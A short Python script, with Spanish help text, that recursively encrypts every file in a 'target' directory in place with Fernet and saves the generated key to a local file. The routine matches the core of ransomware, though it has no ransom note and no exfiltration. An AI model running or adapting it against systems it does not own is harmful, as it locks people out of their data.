import argparse
import os
from cryptography.fernet import Fernet

def encrypt_directory(path, key):
    for file in os.listdir(path):
        file_path = os.path.join(path,file)
        if os.path.isdir(file_path):
            encrypt_directory(file_path, key)
        else: 
            with open(file_path, "rb") as f:
                data = f.read()
            fernet = Fernet(key)
            encrypted_data = fernet.encrypt(data)
            with open(file_path, "wb") as f:
                f.write(encrypted_data)

def main():
    parser = argparse.ArgumentParser(description="Encripta un directorio objetivo.")
    parser.add_argument("path", help="Ruta del directorion a encriptar")
    args = parser.parse_args()

    path = args.path
    key = Fernet.generate_key()
    encrypt_directory(path, key)
    print("Encriptacion completada.")
    with open("encryption_key.key", "wb") as key_file:
        key_file.write(key)

if __name__ =="__main__":
    main()